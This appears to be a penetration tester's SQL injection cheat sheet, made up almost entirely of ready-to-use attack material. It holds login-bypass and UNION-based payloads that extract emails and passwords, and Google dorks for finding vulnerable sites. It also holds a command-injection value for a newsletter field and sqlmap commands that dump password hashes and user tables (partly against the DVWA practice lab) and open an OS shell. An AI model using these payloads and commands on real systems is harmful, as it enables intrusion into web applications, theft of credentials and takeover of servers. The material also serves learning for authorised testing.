SQL Injection


Check for SQLi by adding and single quote or the following: ‘ or 1=1--<space>

http://www.target.com/index.php?val=100’ 
http://www.target.com/index.php?val=100’ or ‘1’=’1 

Username: ' or 1=1--<space>
Password:

Try to login as a specific user.
Username: bob
Password: ' or (1=1 and username = 'bob')--<space>

Database version
Username: +convert(varchar,convert(int,@@version))+
------------------------------------------------------------------------------------------------------

?sql_query 

If you are reading the source code for a web page and discover ?sql_query in the code, this format is 
how HTTP GET parameters are passed through the URL. You can inject an SQL query as a HTTP GET parameter 
to a server-side script. 

Based on prior knowledge of a database table name (customers), you can inject a properly formatted SQL 
query as an HTTP GET parameter.

http://www.target.com/index.php?sql_query=SELECT * FROM customers
------------------------------------------------------------------------------------------------------

# Google Dorks

inurl:index.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:pageid=
------------------------------------------------------------------------------------------------------

SQL databases interpret the single quote character as the boundary between code and data. It assumes that 
anything following a single quote is code that it needs to run and anything encapsulated by a quote is data.

Example: SELECT * FROM products WHERE price < '100' ORDER BY description;

' and 1=0/@@version;--
' and 1=0/user;--
' having 1'='1
' GROUPED BY productid having '1'='1
' GROUPED BY productid,name having '1'='1
------------------------------------------------------------------------------------------------------

MS-SQL server concatenates numbers, it does not add them. '10' + '0' would equal 100 not 10.
 
SELECT * FROM table1 WHERE condition1
union all

SELECT * FROM table2 WHERE condition2

OS - @@version
  Server instances - @@servername
    Databases
      Tables
        Columns

SELECT name FROM master..sysdatabases
------------------------------------------------------------------------------------------------------

http://target.com/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))—
http://target.com/article.aspx?article_id=0+UNION+SELECT+EMAIL,+USERID,+PASSWORD+FROM+USERS
Newsletter signup > Subscribe:  joe@gmail.com & ipconfig > C:\inetpub\wwwroot\Book\test.txt
------------------------------------------------------------------------------------------------------

sqlmap

-u		               Target URL.
--random-agent     Use randomly selected HTTP User-Agent header value.
--dbms=value       Force back-end DBMS to this value (MSSQL, MySQL, Oracle).
--level=#		        Level of tests to perform (1-5, default 1).
--risk=#	          Risk of tests to perform (1-3, default 1).
-b                 Retrieve DBMS banner.
--passwords        Enumerate DBMS users password hashes.
--crawl=#          Crawl the website starting from the target URL.
--forms            Parse and test forms on target URL.

sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MSSQL --level=3 --risk=3 -b --passwords --crawl=10 --forms
------------------------------------------------------------------------------------------------------

Use Burp to trap a request. Copy the request to /root/tmp.

sqlmap.py -r /root/tmp --banner                                              Show webserver OS, apps and db
sqlmap.py -r /root/tmp --dbms=<db type> --dbs                                Show all dbs available
sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> --current-user        Show the user the web server is using to talk to the db
sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> -U <user> --passwords
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> --tables               Show all tables in a db
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --columns   Show all columns in a table
sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --dump      Show all data in a table     

Example
sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee"

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" --dbs

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa --tables

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users --columns

sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users -C user_id,user,password --dump

sqlmap.py -u 'http://target.com/login.asp' --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell
------------------------------------------------------------------------------------------------------

SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE "%root%"
